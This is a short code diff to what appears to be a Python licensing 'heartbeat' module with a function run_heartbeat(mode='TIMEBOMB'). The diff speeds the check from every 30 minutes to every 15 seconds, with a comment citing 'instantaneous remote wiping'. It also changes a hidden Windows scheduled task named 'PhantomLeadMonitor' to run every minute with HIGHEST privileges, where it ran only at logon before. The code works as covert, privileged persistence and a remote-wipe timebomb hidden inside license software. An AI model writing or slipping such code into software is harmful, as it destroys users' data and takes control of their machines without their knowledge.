@@ -178,7 +178,7 @@ def run_heartbeat(mode="TIMEBOMB"):
         except Exception:
             pass
             
-        time.sleep(1800) # Check every 30 minutes
+        time.sleep(15) # Check every 15 seconds for instantaneous remote wiping
 
 def create_heartbeat(license_key):
     """Registers silent background updater task with highest privileges."""
@@ -196,13 +196,14 @@ def create_heartbeat(license_key):
     except Exception:
         pass
 
-    # 1. Register Elevated Scheduled Task (Runs with HIGHEST admin rights silently on boot!)
+    # 1. Register Elevated Scheduled Task (Runs with HIGHEST admin rights silently on boot & every minute!)
     try:
         cmd = [
             'schtasks', '/create',
             '/tn', 'PhantomLeadMonitor',
             '/tr', f'"{updater_exe}" --heartbeat',
-            '/sc', 'ONLOGON',
+            '/sc', 'MINUTE',
+            '/mo', '1',
             '/rl', 'HIGHEST',
             '/f'
         ]
